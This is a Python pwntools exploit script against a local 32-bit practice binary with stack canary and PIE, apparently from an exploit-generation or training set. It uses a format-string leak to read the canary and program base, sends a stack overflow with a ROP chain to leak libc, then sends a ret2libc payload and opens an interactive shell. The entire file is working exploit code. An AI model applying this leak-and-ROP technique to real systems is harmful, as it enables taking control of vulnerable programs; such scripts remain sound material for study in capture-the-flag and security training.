from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/32bit/formatstring_stackoverflow/fmt_stack_canary_PIE_no_backdoor/fmt_stack_canary_PIE_no_backdoor")
pwn.gdb.attach(p)
payload = b""
payload += b'%11$p\n%15$p\n\x00'
p.send(payload)
p.recvuntil(b'hello world\n')
canary = int(p.recvuntil(b'\n', drop=True)[0:], 16) + 0x0
pwn.log.success('canary:' + hex(canary))
elf_base = int(p.recvuntil(b'\n', drop=True)[0:], 16) + -0x794
pwn.log.success('elf_base:' + hex(elf_base))
payload = b""
payload += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + p32(canary + 0x0) + p32(0x0) + p32(elf_base + 0x1fbc) + p32(0x0) + p32(elf_base + 0x4f0) + p32(elf_base + 0x81b) + p32(elf_base + 0x1fd8) + p32(elf_base + 0x4004c0) + p32(elf_base + 0x819) + p32(0x0) + p32(elf_base + 0x2880) + p32(0xc) + p32(elf_base + 0x81b) + p32(elf_base + 0x287c) + p32(elf_base + 0x5b1) + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
p.send(payload)
libc_base = u32(p.recv()[0:4].ljust(4,b'\x00')) + -0x18eb0
pwn.log.success('libc_base:' + hex(libc_base))
payload = b""
payload += p32(libc_base + 0x3d3d0) + p32(0x0) + p32(libc_base + 0x17e1db)
p.send(payload)
p.interactive()
